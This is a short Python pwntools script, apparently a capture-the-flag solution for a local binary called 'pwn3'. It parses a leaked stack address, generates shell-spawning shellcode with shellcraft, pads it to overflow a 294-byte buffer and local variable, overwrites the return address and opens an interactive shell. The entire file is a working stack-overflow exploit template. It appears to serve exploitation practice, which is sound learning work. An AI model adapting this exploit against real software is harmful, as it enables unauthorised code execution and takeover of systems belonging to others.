#!/usr/bin/python3

# import pwntools
from pwn import *
# import re for regex
from re import *

# only show errors
context.log_level = 'ERROR'

# start the binary process
context.binary = ELF("./pwn3", checksec=False)
p = process()

# grab the stack address leaked by the program
line = p.recvline().decode().strip()
leaked_addr = int(search(r'0x[\da-f]+', line).group(), 16)

# generate shellcode that will open a shell
shellcode = asm(shellcraft.sh())
# add the shellcode + padding to fill 294B buffer + 8 byte local variable + address of shellcode to return to and execute
payload = shellcode + b"A" * (302 - len(shellcode)) + p32(leaked_addr)

# send the payload and enter interactive mode for the shell
p.sendline(payload)
p.interactive()
